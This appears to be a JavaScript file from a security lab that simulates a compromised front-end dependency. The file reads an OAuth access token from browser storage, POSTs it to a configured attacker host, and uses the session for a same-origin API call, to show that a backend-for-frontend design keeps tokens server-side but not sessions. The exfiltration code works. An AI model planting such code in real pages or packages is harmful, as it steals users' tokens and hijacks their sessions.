// INTENTIONALLY COMPROMISED DEPENDENCY. Actual execution and exfiltration, never a UI-only simulation.
(async () => {
  const config = await fetch('/lab/config').then((r) => r.json());
  const runId = sessionStorage.getItem('mervikon_run');
  const accessToken = localStorage.getItem('mervikon_access');
  const response = await fetch(config.attacker + '/collect', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ runId, accessToken }),
  });
  const attack = await response.json();
  const sameOrigin = await fetch(config.api, {
    headers:
      config.mode === 'bff'
        ? { 'X-ProAuth-BFF': '1' }
        : { Authorization: `Bearer ${accessToken || ''}` },
  });
  await fetch('/lab/observations', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-Mervikon-Lab': '1' },
    body: JSON.stringify({
      runId,
      observedAt: new Date().toISOString(),
      source: config.mode === 'bff' ? 'Browser BFF' : 'Browser SPA',
      step: 'same-origin',
      httpStatus: sameOrigin.status,
      outcome: 'observed',
    }),
  });
  window.dispatchEvent(
    new CustomEvent('mervikon-widget-result', {
      detail: {
        scriptExecuted: true,
        oauthTokenFound: !!accessToken,
        attacker: attack,
        sameOriginApiStatus: sameOrigin.status,
        lesson:
          'BFF keeps OAuth tokens server-side. Executing same-origin script can still use the session.',
      },
    }),
  );
})().catch(() =>
  window.dispatchEvent(
    new CustomEvent('mervikon-widget-result', {
      detail: { error: 'Attack incomplete; inspect the isolated lab availability.' },
    }),
  ),
);
